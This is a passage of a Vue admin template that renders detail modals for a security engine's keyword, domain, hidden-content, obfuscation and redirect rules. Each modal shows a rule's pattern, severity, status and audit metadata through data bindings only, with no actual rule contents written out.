        <p class="text-xs text-muted-foreground">Could not load the requested keyword rule from the security engine.</p>
        <button 
          type="button"
          @click="closeKeywordViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Blocked Pattern</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedKeywordRule.keyword }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedKeywordRule.severity))">
              {{ selectedKeywordRule.severity }}
            </span>
            <!-- Match Type Badge -->
            <span class="px-2.5 py-1 rounded-full bg-muted text-xs font-mono font-semibold text-foreground border border-border">
              {{ selectedKeywordRule.match_type }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedKeywordRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedKeywordRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedKeywordRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedKeywordRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedKeywordRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedKeywordRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedKeywordRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedKeywordRule.description?.trim()">{{ selectedKeywordRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedKeywordRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedKeywordRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedKeywordRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedKeywordRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeKeywordViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW DOMAIN RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="domainModalState.isView.value"
      :title="isDomainDetailsLoading ? 'Loading Domain Rule...' : (selectedDomainRule ? `Domain Rule #${selectedDomainRule.id}` : 'Domain Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeDomainViewModal"
    >
      <!-- Loading State -->
      <div v-if="isDomainDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving domain rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedDomainRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested domain rule from the security engine.</p>
        <button 
          type="button"
          @click="closeDomainViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Blocked Domain</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedDomainRule.domain }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedDomainRule.severity))">
              {{ selectedDomainRule.severity }}
            </span>
            <!-- Match Type Badge -->
            <span class="px-2.5 py-1 rounded-full bg-muted text-xs font-mono font-semibold text-foreground border border-border">
              {{ selectedDomainRule.match_type }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedDomainRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedDomainRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedDomainRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedDomainRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedDomainRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedDomainRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedDomainRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedDomainRule.description?.trim()">{{ selectedDomainRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedDomainRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedDomainRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedDomainRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedDomainRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeDomainViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW HIDDEN CONTENT RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="hiddenContentModalState.isView.value"
      :title="isHiddenContentDetailsLoading ? 'Loading Hidden Content Rule...' : (selectedHiddenContentRule ? `Hidden Content Rule #${selectedHiddenContentRule.id}` : 'Hidden Content Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeHiddenContentViewModal"
    >
      <!-- Loading State -->
      <div v-if="isHiddenContentDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving hidden content rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedHiddenContentRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested hidden content rule from the security engine.</p>
        <button 
          type="button"
          @click="closeHiddenContentViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">CSS Declaration / Pattern</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedHiddenContentRule.pattern }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedHiddenContentRule.severity))">
              {{ selectedHiddenContentRule.severity }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedHiddenContentRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedHiddenContentRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedHiddenContentRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedHiddenContentRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedHiddenContentRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedHiddenContentRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedHiddenContentRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedHiddenContentRule.description?.trim()">{{ selectedHiddenContentRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedHiddenContentRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedHiddenContentRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedHiddenContentRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedHiddenContentRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeHiddenContentViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW OBFUSCATION RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="obfuscationModalState.isView.value"
      :title="isObfuscationDetailsLoading ? 'Loading Obfuscation Rule...' : (selectedObfuscationRule ? `Obfuscation Rule #${selectedObfuscationRule.id}` : 'Obfuscation Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeObfuscationViewModal"
    >
      <!-- Loading State -->
      <div v-if="isObfuscationDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving obfuscation rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedObfuscationRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested obfuscation rule from the security engine.</p>
        <button 
          type="button"
          @click="closeObfuscationViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Pattern / Regex</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedObfuscationRule.pattern }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedObfuscationRule.severity))">
              {{ selectedObfuscationRule.severity }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedObfuscationRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedObfuscationRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedObfuscationRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedObfuscationRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedObfuscationRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedObfuscationRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedObfuscationRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedObfuscationRule.description?.trim()">{{ selectedObfuscationRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedObfuscationRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedObfuscationRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedObfuscationRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedObfuscationRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeObfuscationViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW REDIRECT RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="redirectModalState.isView.value"
      :title="isRedirectDetailsLoading ? 'Loading Redirect Rule...' : (selectedRedirectRule ? `Redirect Rule #${selectedRedirectRule.id}` : 'Redirect Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeRedirectViewModal"
    >
      <!-- Loading State -->
      <div v-if="isRedirectDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving redirect rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedRedirectRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested redirect rule from the security engine.</p>
        <button 
          type="button"
          @click="closeRedirectViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Redirect Pattern</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedRedirectRule.pattern }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedRedirectRule.severity))">
              {{ selectedRedirectRule.severity }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedRedirectRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedRedirectRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedRedirectRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedRedirectRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedRedirectRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedRedirectRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedRedirectRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedRedirectRule.description?.trim()">{{ selectedRedirectRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedRedirectRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedRedirectRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedRedirectRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
